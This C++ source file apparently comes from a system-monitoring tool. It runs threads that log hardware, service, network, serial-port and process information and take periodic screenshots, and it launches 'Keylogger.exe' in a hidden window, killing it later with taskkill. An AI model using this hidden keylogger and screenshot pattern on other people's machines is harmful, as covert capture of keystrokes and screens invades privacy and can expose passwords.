#include "Singlemodulesrun.h"

pthread_t HI, SC, SI, NI, ES, SP, SS;

void *HI_proc(void *param);
void *SC_proc(void *param);
void *SI_proc(void *param);
void *NI_proc(void *param);
void *ES_proc(void *param);
void *SP_proc(void *param);
void *SS_proc(void *param);

void KillModules(control *C)
{
	pthread_cancel(HI);
	pthread_cancel(SC);
	pthread_cancel(SI);
	pthread_cancel(NI);
	pthread_cancel(ES);
	pthread_cancel(SP);
	pthread_cancel(SS);
	system("taskkill /F /T /IM Keylogger.exe");

	if (!C->keylog)
	{
		ofstream out;
		out.open(logkl, ios::app);
		out << endl << "Keylogger was stopped in "; OutFullData(out); out << endl;
		out.close();
	}
}

void SingleModulesRun(control *C)
{
	pthread_create(&HI, NULL, HI_proc, (void*)C);
	pthread_create(&SC, NULL, SC_proc, (void*)C);
	pthread_create(&SI, NULL, SI_proc, (void*)C);
	pthread_create(&NI, NULL, NI_proc, (void*)C);
	pthread_create(&ES, NULL, ES_proc, (void*)C);
	pthread_create(&SP, NULL, SP_proc, (void*)C);
	pthread_create(&SS, NULL, SS_proc, (void*)C);

	if(C->keylog)
		ShellExecute(0, "open", "Keylogger.exe", NULL, 0, SW_HIDE);
}
void *HI_proc(void *param)
{
	control *CS = (control*)param;

	if(CS->run[0])
		HardWareInfo(CS->run[0], loghw, CS->period[0]);

	return NULL;
}
void *SC_proc(void *param)
{
	control *CS = (control*)param;

	if (CS->run[1])
		GetSampleServiceConfig(CS->run[1], logsc, CS->period[1]);

	return NULL;
}
void *SI_proc(void *param)
{
	control *CS = (control*)param;

	if (CS->run[2])
		SystemInfo(CS->run[2], logsi, CS->period[2]);

	return NULL;
}
void *NI_proc(void *param)
{
	control *CS = (control*)param;

	if (CS->run[3])
		GetCompIP(CS->run[3], logni, CS->period[3]);
	
	return NULL;
}
void *ES_proc(void *param)
{
	control *CS = (control*)param;

	if (CS->run[4])
		EnumerateSerialPorts(CS->run[4], loges, CS->period[4]);
	
	return NULL;
}
void *SP_proc(void *param)
{
	control *CS = (control*)param;

	if (CS->run[5])
		ScanProcess(CS->run[5], logsp, CS->period[5]);
	
	return NULL;
}
void *SS_proc(void *param)
{
	control *CS = (control*)param;

	if (CS->run_s)
		MakeShots(CS->run_s, CS->period_s);

	return NULL;
}